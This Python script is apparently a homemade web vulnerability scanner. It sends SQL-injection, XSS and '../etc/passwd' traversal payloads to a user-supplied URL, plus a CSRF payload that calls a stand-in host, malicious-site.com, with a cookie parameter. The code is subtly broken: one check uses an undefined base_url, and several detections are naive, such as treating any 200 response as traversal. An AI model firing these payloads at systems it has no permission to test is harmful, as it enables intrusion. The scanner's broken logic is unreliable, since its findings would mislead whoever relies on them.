import requests
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import re

# Configure logging
logging.basicConfig(filename='scan_results.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36'
}

def scan_website(base_url):
    try:
        response = requests.get(base_url, headers=headers)
        response.raise_for_status()
        logging.info(f"Scanning {base_url}...")
        check_headers(response)
        check_sql_injection(base_url)
        check_xss(base_url)
        check_csrf(base_url)
        check_clickjacking(response)
        check_directory_traversal(base_url)
        check_insecure_cookies(response)
        check_csp_header(response)
        check_cross_domain_misconfiguration(response)
        check_js_source_inclusion(response)
        check_timestamp_disclosure(base_url)
        check_information_disclosure(base_url)
        check_modern_web_practices(response)
        logging.info("Scan completed.")
    except requests.RequestException as e:
        logging.error(f"Error: {e}")

def check_headers(response):
    required_headers = ['X-Content-Type-Options', 'X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security', 'X-Permitted-Cross-Domain-Policies']
    for header in required_headers:
        if header not in response.headers:
            alert = f"Missing Security Header: {header}"
            print(alert)
            logging.warning(alert)

def check_sql_injection(base_url):
    payloads = ["' OR '1'='1", '" OR "1"="1', "admin'--"]
    for payload in payloads:
        try:
            test_url = urljoin(base_url, payload)
            response = requests.get(test_url, headers=headers)
            if 'sql' in response.text.lower():
                alert = f"Possible SQL Injection vulnerability at: {test_url}"
                print(alert)
                logging.warning(alert)
        except requests.RequestException as e:
            logging.error(f"Error during SQL Injection check: {e}")

def check_xss(base_url):
    payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
    for payload in payloads:
        try:
            test_url = f"{base_url}?q={payload}"
            response = requests.get(test_url, headers=headers)
            if payload in response.text:
                alert = f"Possible XSS vulnerability at: {test_url}"
                print(alert)
                logging.warning(alert)
        except requests.RequestException as e:
            logging.error(f"Error during XSS check: {e}")

def check_csrf(base_url):
    csrf_test_payload = '<img src="http://malicious-site.com/csrf?cookie=' + base_url + '" />'
    try:
        response = requests.post(base_url, data={'payload': csrf_test_payload}, headers=headers)
        if 'csrf' in response.text.lower():
            alert = f"Possible CSRF vulnerability at: {base_url}"
            print(alert)
            logging.warning(alert)
    except requests.RequestException as e:
        logging.error(f"Error during CSRF check: {e}")

def check_clickjacking(response):
    if 'X-Frame-Options' not in response.headers or response.headers['X-Frame-Options'].lower() != 'deny':
        alert = "Clickjacking vulnerability: X-Frame-Options header is missing or not set to 'deny'."
        print(alert)
        logging.warning(alert)

def check_directory_traversal(base_url):
    payloads = ["../etc/passwd", "../index.php"]
    for payload in payloads:
        try:
            test_url = urljoin(base_url, payload)
            response = requests.get(test_url, headers=headers)
            if response.status_code == 200:
                alert = f"Possible Directory Traversal vulnerability at: {test_url}"
                print(alert)
                logging.warning(alert)
        except requests.RequestException as e:
            logging.error(f"Error during Directory Traversal check: {e}")

def check_insecure_cookies(response):
    cookies = response.cookies
    for cookie in cookies:
        if not (cookie.has_nonstandard_attr('Secure') and cookie.has_nonstandard_attr('HttpOnly')):
            alert = f"Insecure Cookie found: {cookie.name}"
            print(alert)
            logging.warning(alert)

def check_csp_header(response):
    if 'Content-Security-Policy' not in response.headers:
        alert = "Missing Content-Security-Policy (CSP) header."
        print(alert)
        logging.warning(alert)

def check_cross_domain_misconfiguration(response):
    # Example check for misconfigured cross-domain headers
    if 'Access-Control-Allow-Origin' in response.headers and response.headers['Access-Control-Allow-Origin'] == '*':
        alert = "Cross-Domain Misconfiguration: Access-Control-Allow-Origin header is set to '*'."
        print(alert)
        logging.warning(alert)

def check_js_source_inclusion(response):
    # Check for inclusion of untrusted JavaScript sources
    soup = BeautifulSoup(response.text, 'html.parser')
    scripts = soup.find_all('script', src=True)
    for script in scripts:
        src = script['src']
        if not src.startswith(base_url):
            alert = f"Cross-Domain JavaScript Source Inclusion: {src}"
            print(alert)
            logging.warning(alert)

def check_timestamp_disclosure(base_url):
    # Example pattern for Unix timestamp disclosure
    timestamp_patterns = [r'\d{10}', r'\d{13}']  # Unix timestamps (10 or 13 digits)
    try:
        response = requests.get(base_url, headers=headers)
        for pattern in timestamp_patterns:
            if re.search(pattern, response.text):
                alert = "Possible Unix Timestamp Disclosure."
                print(alert)
                logging.warning(alert)
    except requests.RequestException as e:
        logging.error(f"Error during Timestamp Disclosure check: {e}")

def check_information_disclosure(base_url):
    # Example check for information disclosure
    info_patterns = [r'Warning', r'Error', r'Exception']
    try:
        response = requests.get(base_url, headers=headers)
        for pattern in info_patterns:
            if re.search(pattern, response.text):
                alert = "Possible Information Disclosure."
                print(alert)
                logging.warning(alert)
    except requests.RequestException as e:
        logging.error(f"Error during Information Disclosure check: {e}")

def check_modern_web_practices(response):
    # Example checks for modern web application security practices
    modern_headers = ['Feature-Policy', 'Permissions-Policy']
    for header in modern_headers:
        if header not in response.headers:
            alert = f"Missing modern security header: {header}"
            print(alert)
            logging.warning(alert)

if __name__ == '__main__':
    target_url = input("Enter the URL to scan (e.g., http://localhost:3000): ")
    scan_website(target_url)
    print("Scan completed. Check 'scan_results.log' for detailed alerts.")
